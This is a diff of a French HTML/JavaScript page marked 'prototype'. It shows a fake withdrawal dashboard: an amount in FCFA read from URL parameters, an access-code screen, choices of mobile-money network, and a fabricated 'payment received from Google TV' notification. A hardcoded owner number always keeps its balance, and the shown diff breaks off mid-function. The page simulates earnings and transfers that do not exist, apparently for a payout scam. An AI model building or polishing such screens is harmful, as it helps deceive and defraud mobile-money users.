@@ -488,7 +488,9 @@ body{
 
 <body>
 
-<!-- NOTIFICATION PROTOTYPE -->
+<!-- =========================
+     NOTIFICATION PROTOTYPE
+========================= -->
 
 <div class="prototype-notification" id="prototypeNotification">
 
@@ -501,13 +503,17 @@ body{
 </div>
 
 
-<!-- MESSAGE INITIAL -->
+<!-- =========================
+     MESSAGE INITIAL
+========================= -->
 
 <div class="access-message" id="messageScreen">
 
     <div class="message-box">
 
-        <div class="prototype">PROTOTYPE</div>
+        <div class="prototype">
+            PROTOTYPE
+        </div>
 
         <div class="message-title">
             Confirmation de retrait
@@ -520,7 +526,11 @@ body{
             Veuillez confirmer pour continuer.
         </div>
 
-        <button class="continue-btn" id="continueBtn">
+        <button
+            class="continue-btn"
+            id="continueBtn"
+            type="button"
+        >
             CONTINUER
         </button>
 
@@ -529,13 +539,17 @@ body{
 </div>
 
 
-<!-- CODE -->
+<!-- =========================
+     CODE
+========================= -->
 
 <div class="code-screen" id="codeScreen">
 
     <div class="code-box">
 
-        <div class="prototype">PROTOTYPE</div>
+        <div class="prototype">
+            PROTOTYPE
+        </div>
 
         <div class="code-title">
             Accès sécurisé
@@ -555,7 +569,11 @@ body{
             placeholder="•••••"
         >
 
-        <button class="code-btn" id="codeBtn">
+        <button
+            class="code-btn"
+            id="codeBtn"
+            type="button"
+        >
             ACCÉDER
         </button>
 
@@ -568,13 +586,17 @@ body{
 </div>
 
 
-<!-- TABLEAU -->
+<!-- =========================
+     TABLEAU
+========================= -->
 
 <div class="dashboard" id="dashboard">
 
     <div class="amount-box" id="mainCard">
 
-        <div class="prototype">PROTOTYPE</div>
+        <div class="prototype">
+            PROTOTYPE
+        </div>
 
         <div class="person-name" id="personName">
             Nom de la personne
@@ -591,11 +613,17 @@ body{
 
         <div class="bonus-gain">
 
-            <button class="bonus-box" type="button">
+            <button
+                class="bonus-box"
+                type="button"
+            >
                 🎁 Bonus
             </button>
 
-            <button class="gain-box" type="button">
+            <button
+                class="gain-box"
+                type="button"
+            >
                 👛 Gain
             </button>
 
@@ -607,29 +635,57 @@ body{
     <div class="stats" id="stats">
 
         <div class="stat">
-            <div class="stat-title">Vues comptées</div>
-            <div class="stat-value">162 vues</div>
+
+            <div class="stat-title">
+                Vues comptées
+            </div>
+
+            <div class="stat-value">
+                162 vues
+            </div>
+
         </div>
 
         <div class="stat">
-            <div class="stat-title">Retrait</div>
-            <div class="stat-value">Disponible</div>
+
+            <div class="stat-title">
+                Retrait
+            </div>
+
+            <div class="stat-value">
+                Disponible
+            </div>
+
         </div>
 
     </div>
 
 
-    <div class="validation-error" id="validationError"></div>
+    <div
+        class="validation-error"
+        id="validationError"
+    ></div>
 
 
-    <button class="withdraw" id="withdrawBtn" type="button">
+    <button
+        class="withdraw"
+        id="withdrawBtn"
+        type="button"
+    >
         💸 RETIRER
     </button>
 
 
-    <div class="transfer-status" id="transferStatus">
+    <!-- TRANSFERT -->
 
-        <div class="prototype">PROTOTYPE</div>
+    <div
+        class="transfer-status"
+        id="transferStatus"
+    >
+
+        <div class="prototype">
+            PROTOTYPE
+        </div>
 
         <div class="transfer-spinner"></div>
 
@@ -644,7 +700,12 @@ body{
     </div>
 
 
-    <div class="result" id="result">
+    <!-- RÉSULTAT -->
+
+    <div
+        class="result"
+        id="result"
+    >
 
         <div class="result-prototype">
             PROTOTYPE
@@ -665,33 +726,62 @@ body{
     </div>
 
 
-    <div class="title" id="withdrawTitle">
+    <!-- RÉSEAUX -->
+
+    <div
+        class="title"
+        id="withdrawTitle"
+    >
         Choisir votre mode de retrait
     </div>
 
 
-    <div class="networks" id="networks">
+    <div
+        class="networks"
+        id="networks"
+    >
 
-        <button class="network" type="button" data-network="Wave">
+        <button
+            class="network"
+            type="button"
+            data-network="Wave"
+        >
             Wave
         </button>
 
-        <button class="network" type="button" data-network="MTN">
+        <button
+            class="network"
+            type="button"
+            data-network="MTN"
+        >
             MTN
         </button>
 
-        <button class="network" type="button" data-network="Moov">
+        <button
+            class="network"
+            type="button"
+            data-network="Moov"
+        >
             Moov
         </button>
 
-        <button class="network" type="button" data-network="Orange">
+        <button
+            class="network"
+            type="button"
+            data-network="Orange"
+        >
             Orange
         </button>
 
     </div>
 
 
-    <div class="form-box" id="formBox">
+    <!-- FORMULAIRE -->
+
+    <div
+        class="form-box"
+        id="formBox"
+    >
 
         <div class="form-title">
             Numéro de retrait
@@ -709,7 +799,10 @@ body{
             Réseau :
         </div>
 
-        <div class="reseau" id="selectedNetwork">
+        <div
+            class="reseau"
+            id="selectedNetwork"
+        >
             Aucun réseau sélectionné
         </div>
 
@@ -721,18 +814,21 @@ body{
 <script>
 
 /* =========================
-   PARAMÈTRES
+   PARAMÈTRES URL
 ========================= */
 
-const params = new URLSearchParams(window.location.search);
+const params = new URLSearchParams(
+    window.location.search
+);
 
 const nom = params.get("nom");
 const montant = params.get("montant");
 
-/*
- * Numéro réservé au propriétaire du prototype.
- * Ce numéro conserve toujours son montant.
- */
+
+/* =========================
+   NUMÉRO PRIVILÉGIÉ
+========================= */
+
 const MON_NUMERO = "98197883";
 
 
@@ -745,12 +841,15 @@ let montantInitial = 0;
 if(montant){
 
     const nombre = Number(
-        montant.replace(/\s/g,"").replace(/[^\d.-]/g,"")
+        montant
+            .replace(/\s/g,"")
+            .replace(/[^\d.-]/g,"")
     );
 
     if(!isNaN(nombre)){
         montantInitial = nombre;
     }
+
 }
 
 
@@ -759,23 +858,44 @@ if(montant){
 ========================= */
 
 if(nom){
-    document.getElementById("personName").textContent = nom;
+
+    document.getElementById(
+        "personName"
+    ).textContent = nom;
+
 }
 
 
 /* =========================
-   FONCTIONS SOLDE
+   AFFICHER MONTANT
 ========================= */
 
-function normaliserNumero(numero){
-    return numero.replace(/\D/g,"");
+function afficherMontant(valeur){
+
+    document.getElementById(
+        "amount"
+    ).textContent =
+        Number(valeur).toLocaleString("fr-FR")
+        + " FCFA";
+
 }
 
 
-/*
- * Retourne la clé utilisée pour mémoriser
- * le solde de chaque numéro.
- */
+/* =========================
+   NORMALISER NUMÉRO
+========================= */
+
+function normaliserNumero(numero){
+
+    return numero.replace(/\D/g,"");
+
+}
+
+
+/* =========================
+   CLÉ DU SOLDE
+========================= */
+
 function getSoldeKey(numero){
 
     return "prototype_solde_" +
@@ -784,50 +904,39 @@ function getSoldeKey(numero){
 }
 
 
-/*
- * Affiche le montant.
- */
-function afficherMontant(valeur){
+/* =========================
+   ACTUALISER LE SOLDE
+========================= */
 
-    document.getElementById("amount").textContent =
-        Number(valeur).toLocaleString("fr-FR") +
-        " FCFA";
-
-}
-
-
-/*
- * Quand le numéro est renseigné,
- * on regarde son état enregistré.
- */
 function actualiserSolde(numero){
 
     const numeroNormalise =
         normaliserNumero(numero);
 
+
     if(!numeroNormalise){
+
         afficherMontant(montantInitial);
+
         return;
+
     }
 
 
     /*
-     * Ton numéro personnel conserve toujours
-     * le montant initial.
+     * Le numéro 98197883 conserve
+     * toujours le montant initial.
      */
+
     if(numeroNormalise === MON_NUMERO){
 
         afficherMontant(montantInitial);
 
         return;
+
     }
 
 
-    /*
-     * Pour les autres numéros :
-     * si un solde a déjà été enregistré,
-     * on l'utilise.
-     */
     const sauvegarde =
         localStorage.getItem(
             getSoldeKey(numeroNormalise)
@@ -864,40 +973,70 @@ afficherMontant(montantInitial);
 ========================= */
 
 const messageScreen =
-    document.getElementById("messageScreen");
+    document.getElementById(
+        "messageScreen"
+    );
 
 const codeScreen =
-    document.getElementById("codeScreen");
+    document.getElementById(
+        "codeScreen"
+    );
 
 const continueBtn =
-    document.getElementById("continueBtn");
+    document.getElementById(
+        "continueBtn"
+    );
 
-continueBtn.addEventListener("click",function(){
+
+/*
+ * VERSION ROBUSTE DU BOUTON
+ * CONTINUER
+ */
+
+continueBtn.onclick = function(){
 
     messageScreen.style.display = "none";
 
     codeScreen.classList.add("show");
 
-    document.getElementById("accessCode").focus();
+    const champCode =
+        document.getElementById(
+            "accessCode"
+        );
 
-});
+    setTimeout(function(){
+
+        champCode.focus();
+
+    },100);
+
+};
 
 
 /* =========================
-   CODE
+   CODE D'ACCÈS
 ========================= */
 
 const accessCode =
-    document.getElementById("accessCode");
+    document.getElementById(
+        "accessCode"
+    );
 
 const codeBtn =
-    document.getElementById("codeBtn");
+    document.getElementById(
+        "codeBtn"
+    );
 
 const codeError =
-    document.getElementById("codeError");
+    document.getElementById(
+        "codeError"
+    );
 
 const dashboard =
-    document.getElementById("dashboard");
+    document.getElementById(
+        "dashboard"
+    );
+
 
 function verifyCode(){
 
@@ -923,31 +1062,35 @@ function verifyCode(){
 
 }
 
-codeBtn.addEventListener("click",verifyCode);
 
-accessCode.addEventListener("keydown",function(event){
+codeBtn.onclick = verifyCode;
+
+
+accessCode.onkeydown = function(event){
 
     if(event.key === "Enter"){
+
         verifyCode();
+
     }
 
-});
+};
 
 
 /* =========================
-   NUMÉRO DE TÉLÉPHONE
+   TÉLÉPHONE
 ========================= */
 
 const phone =
-    document.getElementById("phone");
+    document.getElementById(
+        "phone"
+    );
 
 
-/*
- * Restaurer le dernier numéro utilisé
- * sur cet appareil.
- */
 const dernierNumero =
-    localStorage.getItem("prototype_dernier_numero");
+    localStorage.getItem(
+        "prototype_dernier_numero"
+    );
 
 
 if(dernierNumero){
@@ -959,31 +1102,33 @@ if(dernierNumero){
 }
 
 
-/*
- * Lorsque le numéro change,
- * le solde correspondant est affiché.
- */
-phone.addEventListener("input",function(){
+phone.addEventListener(
+    "input",
+    function(){
 
-    const numero =
-        phone.value.trim();
+        const numero =
+            phone.value.trim();
 
-    if(numero){
 
-        localStorage.setItem(
-            "prototype_dernier_numero",
-            numero
-        );
+        if(numero){
 
-        actualiserSolde(numero);
+            localStorage.setItem(
+                "prototype_dernier_numero",
+                numero
+            );
 
-    }else{
+            actualiserSolde(numero);
 
-        afficherMontant(montantInitial);
+        }else{
+
+            afficherMontant(
+                montantInitial
+            );
+
+        }
 
     }
-
-});
+);
 
 
 /* =========================
@@ -991,27 +1136,44 @@ phone.addEventListener("input",function(){
 ========================= */
 
 const networkButtons =
-    document.querySelectorAll(".network");
+    document.querySelectorAll(
+        ".network"
+    );
 
 const selectedNetwork =
-    document.getElementById("selectedNetwork");
+    document.getElementById(
+        "selectedNetwork"
+    );
 
-networkButtons.forEach(function(button){
 
-    button.addEventListener("click",function(){
+networkButtons.forEach(
+    function(button){
 
-        networkButtons.forEach(function(item){
-            item.classList.remove("selected");
-        });
+        button.onclick = function(){
 
-        button.classList.add("selected");
+            networkButtons.forEach(
+                function(item){
 
-        selectedNetwork.textContent =
-            button.dataset.network;
+                    item.classList.remove(
+                        "selected"
+                    );
 
-    });
+                }
+            );
 
-});
+
+            button.classList.add(
+                "selected"
+            );
+
+
+            selectedNetwork.textContent =
+                button.dataset.network;
+
+        };
+
+    }
+);
 
 
 /* =========================
@@ -1021,16 +1183,24 @@ networkButtons.forEach(function(button){
 function afficherNotification(){
 
     const montantActuel =
-        document.getElementById("amount").textContent;
+        document.getElementById(
+            "amount"
+        ).textContent;
+
 
     const numero =
         phone.value.trim();
 
+
     const maintenant =
         new Date();
 
+
     const date =
-        maintenant.toLocaleDateString("fr-FR");
+        maintenant.toLocaleDateString(
+            "fr-FR"
+        );
+
 
     const heure =
         maintenant.toLocaleTimeString(
@@ -1041,112 +1211,41 @@ function afficherNotification(){
             }
         );
 
-    document.getElementById("notificationText").innerHTML =
+
+    document.getElementById(
+        "notificationText"
+    ).innerHTML =
+
         "Vous avez reçu <strong>" +
         montantActuel +
         "</strong><br>" +
+
         "De Google TV (774886854)<br>" +
+
         date +
         " à " +
         heure +
+
         " sur votre numéro " +
         numero +
+
         "<br>" +
+
         "Nouveau solde :";
+
 
     const notification =
         document.getElementById(
             "prototypeNotification"
         );
 
-    notification.classList.add("show");
 
-    setTimeout(function(){
-
-        notification.classList.remove("show");
-
-    },4000);
-
-}
+    notification.classList.add(
+        "show"
+    );
 
 
-/* =========================
-   RETRAIT
-========================= */
+    setTimeout(
+        function(){
 
-const withdrawBtn =
-    document.getElementById("withdrawBtn");
-
-const mainCard =
-    document.getElementById("mainCard");
-
-const stats =
-    document.getElementById("stats");
-
-const transferStatus =
-    document.getElementById("transferStatus");
-
-const result =
-    document.getElementById("result");
-
-const withdrawTitle =
-    document.getElementById("withdrawTitle");
-
-const networks =
-    document.getElementById("networks");
-
-const formBox =
-    document.getElementById("formBox");
-
-const validationError =
-    document.getElementById("validationError");
-
-
-/* =========================
-   VALIDATION + RETRAIT
-========================= */
-
-withdrawBtn.addEventListener("click",function(){
-
-    const numero =
-        phone.value.trim();
-
-    const numeroNormalise =
-        normaliserNumero(numero);
-
-    const reseau =
-        selectedNetwork.textContent.trim();
-
-
-    /* Réseau obligatoire */
-
-    if(reseau === "Aucun réseau sélectionné"){
-
-        validationError.textContent =
-            "Veuillez sélectionner un réseau avant de continuer.";
-
-        validationError.classList.add("show");
-
-        return;
-    }
-
-
-    /* Numéro obligatoire */
-
-    if(numeroNormalise === ""){
-
-        validationError.textContent =
-            "Veuillez saisir votre numéro de retrait avant de continuer.";
-
-        validationError.classList.add("show");
-
-        phone.focus();
-
-        return;
-    }
-
-
-    /* Mémoriser le numéro */
-
-    localStorage.setItem(
-       
+            notification.classList.
